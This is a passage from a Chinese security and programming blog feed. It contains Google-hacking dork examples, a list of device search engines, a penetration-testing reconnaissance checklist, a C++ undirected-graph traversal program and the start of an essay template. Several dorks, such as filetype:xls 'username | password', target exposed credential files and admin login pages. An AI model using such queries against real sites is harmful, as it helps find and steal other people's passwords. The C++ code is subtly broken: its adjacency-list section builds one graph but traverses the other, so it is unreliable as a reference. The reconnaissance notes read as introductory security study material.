<li><p>site：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>  –&gt;搜索范围限制在某网站或顶级域名中。</p>
</li>
<li><p>inurl: php?id=1  –&gt;Google会返回那些在URL里面包含了我们查询关键词的网页</p>
</li>
<li><p>intext:后台 –&gt;当我们用intext进行查询的时候，Google会返回那些在文本正文里面包含我们查询关键词的网页。</p>
</li>
<li><p>intitle: 登陆系统 –&gt; Google会返回那些在网页标题为查询结果</p>
<p><strong>例子</strong></p>
</li>
<li><p>inurl: /admin/login.php</p>
</li>
<li><p>inurl: qq.txt</p>
</li>
<li><p>filetype: xls “username | password”</p>
</li>
<li><p>intext: password “Login info” filetype:txt</p>
</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">扩展思路：白帽子提供google搜索方法语法</span><br><span class="line">https:&#x2F;&#x2F;www.exploit-db.com&#x2F;google-hacking-database</span><br></pre></td></tr></table></figure></div>

<h2 id="网络空间引擎"><a href="#网络空间引擎" class="headerlink" title="网络空间引擎"></a>网络空间引擎</h2><blockquote>
<p><strong>基于物联网搜索，搜索联网的网络设备</strong></p>
<ul>
<li>钟馗之眼 - <a href="http://www.zoomeye.org" target="_blank" rel="noopener">http://www.zoomeye.org</a></li>
<li>Shodan  - <a href="https://www.shodan.io" target="_blank" rel="noopener">https://www.shodan.io</a></li>
<li>fofa        - <a href="https://fofa.so" target="_blank" rel="noopener">https://fofa.so</a></li>
<li>傻蛋       - <a href="https://www.oshadan.com" target="_blank" rel="noopener">https://www.oshadan.com</a></li>
<li>Dnsdb搜索 -<a href="https://www.dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://www.dnsdb.io/zh-cn/</a></li>
</ul>
</blockquote>
<blockquote>
<p><strong>精细化搜索</strong></p>
<ul>
<li>微信公众号 <a href="https://weixin.sogou.com" target="_blank" rel="noopener">https://weixin.sogou.com</a>  <strong>比如孤桜懶契</strong></li>
<li>知乎相关 <a href="https://www.zhibu.com/search?q=" target="_blank" rel="noopener">https://www.zhibu.com/search?q=</a></li>
<li>微博相关 <a href="https://s.weibo.com/?Refer=" target="_blank" rel="noopener">https://s.weibo.com/?Refer=</a></li>
<li>购物 <a href="https://search.jd.com/search?enc=utf-8&amp;keyword" target="_blank" rel="noopener">https://search.jd.com/search?enc=utf-8&amp;keyword</a>:</li>
<li>github <a href="https://github.com/search?q=" target="_blank" rel="noopener">https://github.com/search?q=</a></li>
<li>贴吧<a href="https://tieba.baidu.com/f/search/res?qw=" target="_blank" rel="noopener">https://tieba.baidu.com/f/search/res?qw=</a></li>
</ul>
</blockquote>
<p><strong>欢迎来到我的博客<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></strong></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
        <tag>渗透测试基础</tag>
        <tag>Google hack语法</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息收集】基础模板</title>
    <url>/2021/06/14/%E3%80%90%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E3%80%91%E5%9F%BA%E7%A1%80%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="信息收集整理"><a href="#信息收集整理" class="headerlink" title="信息收集整理"></a>信息收集整理</h1><h2 id="目标事件"><a href="#目标事件" class="headerlink" title="目标事件"></a>目标事件</h2><blockquote>
<ul>
<li>历史漏洞</li>
<li>使用手册</li>
<li>手机APP</li>
<li>小程序</li>
</ul>
</blockquote>
<h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><blockquote>
<ul>
<li>子域名</li>
<li>证书</li>
</ul>
</blockquote>
<h2 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h2><blockquote>
<ul>
<li>php</li>
<li>jsp</li>
<li>asp</li>
<li>aspx</li>
</ul>
</blockquote>
<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><blockquote>
<ul>
<li>mysql</li>
<li>mssql</li>
<li>oracle</li>
</ul>
</blockquote>
<h2 id="目录爬行"><a href="#目录爬行" class="headerlink" title="目录爬行"></a>目录爬行</h2><blockquote>
<ul>
<li><p>目录遍历</p>
</li>
<li><p>目录文件</p>
</li>
</ul>
</blockquote>
<h2 id="目录浏览"><a href="#目录浏览" class="headerlink" title="目录浏览"></a>目录浏览</h2><blockquote>
<ul>
<li>君子协议 robots.txt</li>
<li>目录地址 - 登陆</li>
<li>框架所开发的路由</li>
</ul>
</blockquote>
<h2 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h2><blockquote>
<ul>
<li>.svn</li>
<li>.git</li>
<li>备份文件</li>
</ul>
</blockquote>
<h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><blockquote>
<ul>
<li><p>IIS</p>
</li>
<li><p>apache</p>
</li>
<li><p>nginx</p>
</li>
</ul>
</blockquote>
<p>服务器系统</p>
<blockquote>
<ul>
<li><p>windows</p>
</li>
<li><p>linux</p>
</li>
</ul>
</blockquote>
<h2 id="DNS解析"><a href="#DNS解析" class="headerlink" title="DNS解析"></a>DNS解析</h2><blockquote>
<ul>
<li><p>阿里云</p>
</li>
<li><p>西部数码</p>
</li>
<li><p>传送域漏洞</p>
</li>
</ul>
</blockquote>
<h2 id="cms"><a href="#cms" class="headerlink" title="cms"></a>cms</h2><blockquote>
<ul>
<li><p>dedecms</p>
</li>
<li><p>wordpress</p>
</li>
</ul>
</blockquote>
<h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><blockquote>
<ul>
<li>thinkphp</li>
<li>struts2</li>
</ul>
</blockquote>
<h2 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h2><blockquote>
<ul>
<li>HTTP:80</li>
<li>FTP:21</li>
<li>mysql 3306</li>
</ul>
</blockquote>
<h2 id="目标IP"><a href="#目标IP" class="headerlink" title="目标IP"></a>目标IP</h2><blockquote>
<ul>
<li>阿里云</li>
<li>历史解析</li>
<li>超级ping</li>
</ul>
</blockquote>
<h2 id="C段地址"><a href="#C段地址" class="headerlink" title="C段地址"></a>C段地址</h2><blockquote>
<ul>
<li>ip</li>
<li>域名</li>
</ul>
</blockquote>
<h2 id="idc"><a href="#idc" class="headerlink" title="idc"></a>idc</h2><blockquote>
<ul>
<li>阿里云</li>
</ul>
</blockquote>
<h2 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h2><blockquote>
<ul>
<li>云盾</li>
<li>云锁</li>
<li>安全狗</li>
<li>安全卫士</li>
</ul>
</blockquote>
<h2 id="图床"><a href="#图床" class="headerlink" title="图床"></a>图床</h2><blockquote>
<ul>
<li><p>七牛云</p>
</li>
<li><p>阿里云</p>
</li>
</ul>
</blockquote>
<h2 id="安全措施"><a href="#安全措施" class="headerlink" title="安全措施"></a>安全措施</h2><blockquote>
<ul>
<li>自定义404、伪静态处理、流量防护登</li>
<li>cdn<ul>
<li>白盾云大俗</li>
<li>加速乐</li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="第三方资源引用"><a href="#第三方资源引用" class="headerlink" title="第三方资源引用"></a>第三方资源引用</h2><blockquote>
<ul>
<li><p>SDK</p>
</li>
<li><p>js</p>
</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
        <tag>渗透测试基础</tag>
      </tags>
  </entry>
  <entry>
    <title>[VC]无向图遍历（邻接矩阵和邻接表）</title>
    <url>/2021/06/13/%5BVC%5D%E6%97%A0%E5%90%91%E5%9B%BE%E9%81%8D%E5%8E%86%EF%BC%88%E9%82%BB%E6%8E%A5%E7%9F%A9%E9%98%B5%E5%92%8C%E9%82%BB%E6%8E%A5%E8%A1%A8%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="C-图遍历完整代码-无向（邻接矩阵和邻接表）"><a href="#C-图遍历完整代码-无向（邻接矩阵和邻接表）" class="headerlink" title="[C]图遍历完整代码-无向（邻接矩阵和邻接表）"></a>[C]图遍历完整代码-无向（邻接矩阵和邻接表）</h1><h2 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h2><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210613205513948.png" alt="image-20210613205513948"></p>
<h2 id="完整代码奉上"><a href="#完整代码奉上" class="headerlink" title="完整代码奉上"></a>完整代码奉上</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MaxVertexNum 100 <span class="comment">//定义最大顶点数</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//=========定义标志向量，为全局变量=======</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;FALSE,TRUE&#125; Boolean;</span><br><span class="line"></span><br><span class="line">Boolean visited[MaxVertexNum];</span><br><span class="line"></span><br><span class="line"><span class="comment">//*********************基于邻接矩阵图遍历*********************</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> vexs[MaxVertexNum];  <span class="comment">//顶点表</span></span><br><span class="line">	<span class="keyword">int</span> edges[MaxVertexNum][MaxVertexNum]; <span class="comment">//邻接矩阵，就是列和行</span></span><br><span class="line">	<span class="keyword">int</span> n,e; <span class="comment">//图中的顶点数n和边数e</span></span><br><span class="line">&#125;MGraph; <span class="comment">//Adjacency Matrix(邻接矩阵)表示的图的类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//=========建立无向邻接矩阵========</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateMGraph</span><span class="params">(MGraph *G)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,k;</span><br><span class="line">	<span class="keyword">char</span> a;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"(输入顶点和边：)input VertexNum(n) and EdgesNum(e):"</span>;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;G-&gt;n&gt;&gt;G-&gt;e; <span class="comment">//输入顶点数和边数</span></span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"Input Vertx string : "</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;G-&gt;n; i++) </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;a;  </span><br><span class="line">		G-&gt;vexs[i]=a; <span class="comment">//读入顶点信息，建立定点表</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;G-&gt;n; i++)</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;G-&gt;n; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			G-&gt;edges[i][j]=<span class="number">0</span>;  <span class="comment">//初始化邻接矩阵</span></span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"Input edges, Create Adjacency Matrix :"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">for</span>(k=<span class="number">0</span>; k&lt;G-&gt;e; k++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;i&gt;&gt;j;  <span class="comment">//输入边（Vi，Vj）的顶点序号   也就是可达</span></span><br><span class="line">		G-&gt;edges[i][j]=<span class="number">1</span>;</span><br><span class="line">		G-&gt;edges[j][i]=<span class="number">1</span>; <span class="comment">//若为无向图，矩阵为对称矩阵；若建立有向图可不需此步骤。</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//========DFS：深度优先遍历的递归算法======</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFSM</span><span class="params">(MGraph *G, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//以Vi为出发点对邻接矩阵表示的图G进行DFS搜索，邻接矩阵是0,1矩阵</span></span><br><span class="line">	<span class="keyword">int</span> j;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;G-&gt;vexs[i];</span><br><span class="line">	visited[i]=TRUE;</span><br><span class="line">	<span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;G-&gt;n; j++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(G-&gt;edges[i][j]==<span class="number">1</span> &amp;&amp; ! visited[j])</span><br><span class="line">			DFSM(G,j);   <span class="comment">//（Vi，Vj）∈E，且Vj未访问过，故Vj为新出发点</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(MGraph *G)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;G-&gt;n; i++)</span><br><span class="line">		visited[i]=FALSE; <span class="comment">//标志向量初始化</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;G-&gt;n; i++)</span><br><span class="line">		<span class="keyword">if</span>(!visited[i]) <span class="comment">//Vi未访问过</span></span><br><span class="line">			DFSM(G,i);  <span class="comment">//以Vi为源点开始DFS搜索</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//===========BFS：广度优先遍历=======</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BFS</span><span class="params">(MGraph *G, <span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//以Vk为源点对用邻接矩阵表示的图G进行广度优先搜索</span></span><br><span class="line">	<span class="keyword">int</span> i,j,f=<span class="number">0</span>,r=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> cq[MaxVertexNum];  <span class="comment">//定义队列</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;G-&gt;n; i++)</span><br><span class="line">		visited[i]=FALSE;   <span class="comment">//标志向量初始化</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;G-&gt;n; i++)</span><br><span class="line">		cq[i]=<span class="number">-1</span>;   <span class="comment">//队列初始化</span></span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;G-&gt;vexs[k]; <span class="comment">//访问源点Vk</span></span><br><span class="line">	visited[k]=TRUE;  <span class="comment">//将已访问标志位TRUE</span></span><br><span class="line">	cq[r]=k; <span class="comment">//源点Vk进入队列</span></span><br><span class="line">	<span class="keyword">while</span>(cq[f]!=<span class="number">-1</span>)  <span class="comment">//队列非空就执行</span></span><br><span class="line">	&#123;</span><br><span class="line">		i=cq[f];  </span><br><span class="line">		f=f+<span class="number">1</span>;      <span class="comment">//Vi出队</span></span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span> ; j&lt;G-&gt;n; j++)  <span class="comment">//依次Vi</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(!visited[j] &amp;&amp; G-&gt;edges[i][j]==<span class="number">1</span>)  <span class="comment">//Vj未访问</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;G-&gt;vexs[j]; <span class="comment">//访问Vj</span></span><br><span class="line">				visited[j]=TRUE;</span><br><span class="line">				r=r+<span class="number">1</span>;</span><br><span class="line">				cq[r]=j;  <span class="comment">//通过访问Vj入队</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*********************基于邻接表图遍历*********************</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> //边表结点</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">int</span> adjvex;  <span class="comment">//邻接点域</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span> <span class="comment">//链域</span></span><br><span class="line">&#125; EdgeNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">vnode</span>  //顶点表结点</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> vertex; <span class="comment">//顶点域</span></span><br><span class="line">	EdgeNode *firstedge; <span class="comment">//边表头指针</span></span><br><span class="line">&#125; VertexNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> VertexNode AdjList[MaxVertexNum];</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	AdjList adjlist; <span class="comment">//邻接表</span></span><br><span class="line">	<span class="keyword">int</span> n,e; <span class="comment">//图中当前顶点数和边数</span></span><br><span class="line">&#125; ALGraph; <span class="comment">//图类型 -Adjacency List 邻接表</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//=========建立图的邻接表=======</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CreateALGraph</span><span class="params">(ALGraph *G)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,k;</span><br><span class="line">	<span class="keyword">char</span> a;</span><br><span class="line">	EdgeNode *s; <span class="comment">//定义边表结点</span></span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"（输入顶点和边）Input VertexNum(n) and EdgesNum(e): "</span>;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;G-&gt;n&gt;&gt;G-&gt;e; <span class="comment">//读入顶点数和边数</span></span><br><span class="line">	fflush(<span class="built_in">stdin</span>); <span class="comment">//清空内存缓冲</span></span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"(输入顶点信息)Input Vertex string:"</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;G-&gt;n; i++)<span class="comment">//建立顶点表</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">		G-&gt;adjlist[i].vertex=a; <span class="comment">//读入顶点信息</span></span><br><span class="line">		G-&gt;adjlist[i].firstedge=<span class="literal">NULL</span>; <span class="comment">//边表置为空</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"(输入边，创建邻接表)Input edges,Creat Adjacency List"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">for</span>(k=<span class="number">0</span>; k&lt;G-&gt;e; k++) <span class="comment">//无向建立边表</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;i&gt;&gt;j;  <span class="comment">//读入边（Vi， Vj）的顶点对应序号</span></span><br><span class="line">		s=(EdgeNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));  <span class="comment">//生成边表结点</span></span><br><span class="line">		s-&gt;adjvex=j;  <span class="comment">//邻接点序号为j</span></span><br><span class="line">		s-&gt;next=G-&gt;adjlist[i].firstedge;</span><br><span class="line">		G-&gt;adjlist[i].firstedge=s; <span class="comment">//将新结点*S插入顶点Vi的边表头部</span></span><br><span class="line">		s=(EdgeNode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(EdgeNode));</span><br><span class="line">		s-&gt;adjvex=i; <span class="comment">//邻接点序号为i</span></span><br><span class="line">		s-&gt;next=G-&gt;adjlist[j].firstedge;</span><br><span class="line">		G-&gt;adjlist[j].firstedge=s;  <span class="comment">//将新结点*S插入顶点Vj的边表头部</span></span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//========DFS：深度优先遍历的递归算法======</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFSM</span><span class="params">(ALGraph *G, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//以Vi为出发点对邻接链表表示的图G进行DFS搜索</span></span><br><span class="line">	 EdgeNode *p;</span><br><span class="line">	 <span class="built_in">cout</span>&lt;&lt;G-&gt;adjlist[i].vertex;  <span class="comment">//访问顶点Vi</span></span><br><span class="line">	 visited[i]=TRUE;  <span class="comment">//标记Vi已访问</span></span><br><span class="line">	 p=G-&gt;adjlist[i].firstedge; <span class="comment">//取Vi边表的头指针</span></span><br><span class="line">	 <span class="keyword">while</span>(p) <span class="comment">//依次搜索Vi的邻接点Vj，这里vj=p-&gt;adjvex</span></span><br><span class="line">	 &#123;</span><br><span class="line">		<span class="keyword">if</span>(! visited[p-&gt;adjvex]) <span class="comment">//若Vj尚未被访问</span></span><br><span class="line">			DFSM(G,p-&gt;adjvex);  <span class="comment">//则以Vj为出发点向纵深搜索</span></span><br><span class="line">		p=p-&gt;next; <span class="comment">//找Vi的下一个邻接点</span></span><br><span class="line">	 &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(ALGraph *G)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;G-&gt;n; i++)</span><br><span class="line">		visited[i]=FALSE;  <span class="comment">//标志向量初始化</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;G-&gt;n; i++)</span><br><span class="line">		<span class="keyword">if</span>(!visited[i]) <span class="comment">//Vi未访问过</span></span><br><span class="line">			DFSM(G,i); <span class="comment">//以Vi为源点开始DFS搜索</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//==========BFS：广度优先遍历=========</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BFS</span><span class="params">(ALGraph *G, <span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//以Vk为源点对用邻接链表表示的图G进行广度优先搜索</span></span><br><span class="line">	<span class="keyword">int</span> i,f=<span class="number">0</span>,r=<span class="number">0</span>;</span><br><span class="line">	EdgeNode *p;</span><br><span class="line">	<span class="keyword">int</span> cq[MaxVertexNum]; <span class="comment">//定义FIFO队列</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;G-&gt;n; i++)</span><br><span class="line">		visited[i]=FALSE; <span class="comment">//标志向量初始化</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;=G-&gt;n; i++)</span><br><span class="line">        cq[i]=<span class="number">-1</span>;    <span class="comment">//初始化队列</span></span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;G-&gt;adjlist[k].vertex; <span class="comment">//访问源点Vk</span></span><br><span class="line">	visited[k]=TRUE;</span><br><span class="line">	cq[r]=k;  <span class="comment">//Vk已访问，将其入队。注意，实际上是将其序号入队</span></span><br><span class="line">	<span class="keyword">while</span>(cq[f]!=<span class="number">-1</span>) <span class="comment">//队列非空则执行</span></span><br><span class="line">	&#123;</span><br><span class="line">		i=cq[f];</span><br><span class="line">		f=f+<span class="number">1</span>;</span><br><span class="line">		p=G-&gt;adjlist[i].firstedge; <span class="comment">//取Vi的边表头指针</span></span><br><span class="line">		<span class="keyword">while</span>(p) <span class="comment">//依次搜索Vi的邻接点Vj（令p-&gt;adjvex=j）</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(!visited[p-&gt;adjvex])   <span class="comment">//若Vj未访问过，Vj是指的邻接点</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;G-&gt;adjlist[p-&gt;adjvex].vertex; <span class="comment">//访问Vj</span></span><br><span class="line">				visited[p-&gt;adjvex]=TRUE;</span><br><span class="line">				r=r+<span class="number">1</span>;</span><br><span class="line">				cq[r]=p-&gt;adjvex; <span class="comment">//访问过的Vj入队</span></span><br><span class="line">			&#125;</span><br><span class="line">			p=p-&gt;next;  <span class="comment">//找Vi的下一个邻接点</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="comment">//endwhile</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> a,b;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//基于邻接矩阵遍历图</span></span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"*********************基于邻接矩阵无向图遍历*********************"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	MGraph *G;</span><br><span class="line">	G=(MGraph *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(MGraph));</span><br><span class="line">	CreateMGraph(G); <span class="comment">//建立邻接矩阵</span></span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"(-基于邻接矩阵-输出深度优先搜索)Print Graph DFS: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	DFS(G);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"-基于邻接矩阵-输入从哪个顶点开始遍历: "</span>;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"(-基于邻接矩阵-输出广度优先搜索)Print Graph BFS: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	BFS(G,a);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//基于邻接表遍历图</span></span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"*********************基于邻接表无向图遍历*********************"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    ALGraph *A;</span><br><span class="line">	A=(ALGraph *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ALGraph));</span><br><span class="line">	CreateALGraph(A);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"(-基于邻接表-输出深度优先搜索)Print Graph DFS: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	DFS(G);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"(-基于邻接表-输出广度优先搜索)Print Graph BFS: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;b;</span><br><span class="line">	BFS(G,b);</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>C语言</tag>
        <tag>成长之路</tag>
      </tags>
  </entry>
  <entry>
    <title>议论文的基本万能模板</title>
    <url>/2021/05/28/%E8%AE%AE%E8%AE%BA%E6%96%87%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%B8%87%E8%83%BD%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="“名言类”议论文的基本框架"><a href="#“名言类”议论文的基本框架" class="headerlink" title="“名言类”议论文的基本框架"></a>“名言类”议论文的基本框架</h1><blockquote>
<p>开头段：①引出主题 +②表明立场</p>
<p><strong>主题段：论证主题</strong></p>
<p>结尾段：①重申立场 +  ②建议</p>
</blockquote>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">题目：'You can cite examples to illustrate the importance of paying attention to others' opinions.</span><br></pre></td></tr></table></figure>



